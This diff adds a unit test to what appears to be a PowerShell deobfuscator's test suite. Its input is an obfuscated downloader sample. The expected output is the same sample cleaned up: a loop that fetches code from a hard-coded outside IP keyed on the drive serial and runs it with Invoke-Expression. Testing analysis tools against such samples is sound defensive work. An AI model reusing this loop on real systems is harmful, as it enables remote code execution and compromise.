@@ -668,3 +668,142 @@ class TestPs1RealWorldLarge(TestUnitBase):
             '''
         )
         self.assertIn(goal, test)
+
+    def test_junk_statement_downloader(self):
+        data = inspect.cleandoc(
+            """
+            $mlvxprxbencyv = 1 + 1
+            $wtdvfysfnlfvwzf = (2 + 2 * 2 - 2) / 2
+            $ppvvglp = New-Object -Com "Scripting.FileSystemObject"
+            $dfe = 'http://1'
+            $krswmmqghhddtt = "Math still works"
+            function Galaxy { return (Get-Random).ToString() + "RandomText" }
+            $lhjitanp = [math]::Abs(-99) * 3
+            $owtmomk = ((300 / 3) * 8 % 7) -as [string]
+            $cqtadq = 1024
+            $ybtmksnbbh = 0
+            $gpqtroqs = 42 * 5 / 2 - 3
+            $cwyvniykt = @(1, 2, 3, 4, 5)
+            [void]([math]::Sqrt((Get-Random -Minimum 10 -Maximum 200)))
+            $fbdmeafxpodympg = "dummy"
+            $exayoji = "Hello" + "World"
+            $bpv = '81.174.1'
+            $oydxcggocwe = "This text nothing"
+            $vltexqfzvp = "Z" * (Get-Random -Minimum 5 -Maximum 10)
+            $ippoibvuys = "random"
+            $exvlowbuyg = (Get-Random -Minimum 100 -Maximum 9999) * 3
+            $nnyvscpsmiomrs = [Math]::Pow((Get-Random -Minimum 1 -Maximum 10), 3) | Out-Null
+            $gdctrzvcszplcht = Get-Location
+            $ftdulrxj = "Z"
+            $jvkmzwelcsizsjw = ([math]::PI * 100).tostring("F2")
+            $chhmcwwrtyvd = "Attempting retry..."
+            $vbzdfwzqdlby = New-Object System.Text.StringBuilder
+            $pzkavxhrfngkm = @("one", "two", "three") | Measure-Object | ForEach-Object { $_.Count }
+            $xbddvfiqmytaj = New-Object -Com "WScript.Shell"
+            (Get-Random -Minimum 0 -Maximum 100) | Out-Null
+            [void]([Math]::Abs(-1))
+            $yim = '64.47/'
+            $besrgrmefoy += 512
+            $wghxrx = [Math]::Sqrt((Get-Random -Minimum 1 -Maximum 100))
+            $kjipaunrqlb = Get-Random -Minimum 1 -Maximum 1000
+            $bjqcxoavczkcmw = (Get-Random -Minimum 1 -Maximum 100) / (Get-Random -Minimum 1 -Maximum 50)
+            $wxnhjhbiatqcxbe = 42 + 150 / 3
+            [void](123 + 456)
+            $msouzimvsqxi = Get-Date
+            $skavxjzompjr = "ErrorCaught"
+            $fswifypagmi = (1..5 | ForEach-Object {$_ * 2}) -join ","
+            $iserrzpejirfy | ForEach-Object { [void]$_ }
+            $fwsobnoglizfg = Get-Random -Minimum 0 -Maximum 50
+            $nazpbdnmu = [int[]](1..5 | ForEach-Object { Get-Random }) -join "-"
+            $gwytydeslrirn = Get-Date | Out-Null
+            $avjmqrliqyccet = (Get-Random -Minimum 1000 -Maximum 5000)
+            $cdecuiucsrarpxx = (2023 - 1980) * 42
+            $fepafhmcl = "More noise" + " to avoid clean readability"
+            [int]$liootiwrviiews = 5 * 5 + [math]::Sqrt(4)
+            $ywwkjcbdpuov = "abc123"
+            $aefqnhv = $ppvvglp.GetDrive("c:").SerialNumber
+            [System.Guid]::NewGuid() | Out-Null
+            $yvgjtypkl = "unused computation " + [Math]::Sqrt(25)
+            $vcxdmjtauzhhc = 5 * 20
+            $gnmmvxkbocwaz = @(1, 2, 3, 4, 5)
+            $oysdesi = New-Object Threading.Mutex($false, $aefqnhv);
+            $pvizspwoouj = (Get-Date).Ticks % 12345
+            $wwlciopihhadkr = (Get-Random -Minimum 100 -Maximum 200)
+            $klqhcspbg = [math]::Pow(2, 8)
+            function Comet { return (Get-Random -Minimum 0 -Maximum 2) -eq 1 }
+            [void]"Obfuscation step - random action inserted"
+            $fkopdjm = $oysdesi.WaitOne(1)
+            $lbjvoxmqbpbudi = [math]::Sqrt(144) + 42
+            $wzmtzitqawb = "Mutex" + "Disposed"
+            $zngzpviistuppm = [math]::Pow(2, 8)
+            $ozwshblbwcgtiu = Get-Random -Minimum 1 -Maximum 10
+            $essvvhma = @("PowerShell", "code", "analysis")
+            $aefqnhv = "{0:X}" -f $aefqnhv
+            $aefqnhv = [convert]::toint64($aefqnhv,16)
+            $pimjxqwedeiix = (Get-Random -Minimum 1 -Maximum 100)
+            $lhjwgbfgwuvk = (Get-Date).ToUniversalTime()
+            $rwzbjqrz = "RandomString" + [guid]::NewGuid().ToString("n")
+            $serial = $aefqnhv
+            $zhufmykmxtajoo = "Invoke-Command -ScriptBlock { Write-Output 'Dummy' }"
+            $jygmtadrlrlghur = [Guid]::NewGuid().ToString()
+            $ip = $dfe + $bpv + $yim 
+            $uxriyewef = [int[]](1..5 | ForEach-Object { Get-Random }) -join "-"
+            [void](2 + 2 * (Get-Random -Minimum 1 -Maximum 5))
+            $url = $ip+$serial
+            $glywfbxgvradi = @(1,2,3,4,5,6,7,8,9,10,11,12,13,14)
+            $fakkywqqcz = ([char[]](65..90 + 97..122 | Get-Random -Count 10) -join "")
+            [array]::Reverse("random_string".ToCharArray())
+            $xaumbtf = New-Object Net.WebClient
+            $iusnr = @("alpha", "beta", "gamma", "delta")
+            while ($true) {
+            try {
+            $hnuzhmo=$xaumbtf.DownloadString($url)
+            }
+            catch {
+            $kugpxqk = [math]::Sqrt(36)
+            (Get-Random).GetHashCode() | Out-Null
+            $jnldg = 5 -eq 5
+            $nlllqdmhdpocywy = [int]"45" + 5
+            Start-Sleep -s 5
+            $rgfyxmaam = [array]::Reverse((1,2,3,4))
+            $rljibuuipy = Get-Process | Select-Object -First 1
+            continue
+            }
+            Invoke-Expression $hnuzhmo
+            Start-Sleep -s 5
+            $ilbnpkkyugskxqb = -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+            }
+            $oysdesi.ReleaseMutex();
+            $oysdesi.Dispose();
+            """
+        )
+        goal = inspect.cleandoc(
+            """
+            $ppvvglp = New-Object -Com "Scripting.FileSystemObject"
+            New-Object System.Text.StringBuilder
+            New-Object -Com "WScript.Shell"
+            $aefqnhv = $ppvvglp.GetDrive("c:").SerialNumber
+            $oysdesi = New-Object Threading.Mutex ($False, $aefqnhv)
+            $oysdesi.WaitOne(1)
+            $aefqnhv = "{0:X}" -f $aefqnhv
+            $aefqnhv = [Convert]::ToInt64($aefqnhv, 16)
+            $serial = $aefqnhv
+            $url = "http://[[C2]]/${serial}"
+            $xaumbtf = New-Object Net.WebClient
+            while ($True) {
+              try {
+                $hnuzhmo = $xaumbtf.DownloadString($url)
+              } catch {
+                Start-Sleep -s 5
+                continue
+              }
+              Invoke-Expression $hnuzhmo
+              Start-Sleep -s 5
+            }
+            $oysdesi.ReleaseMutex()
+            $oysdesi.Dispose()
+            """
+        ).replace('[[C2]]', '181.174.164''.47')
+
+        test = data | self.load() | str
+        self.assertIn(goal, test)
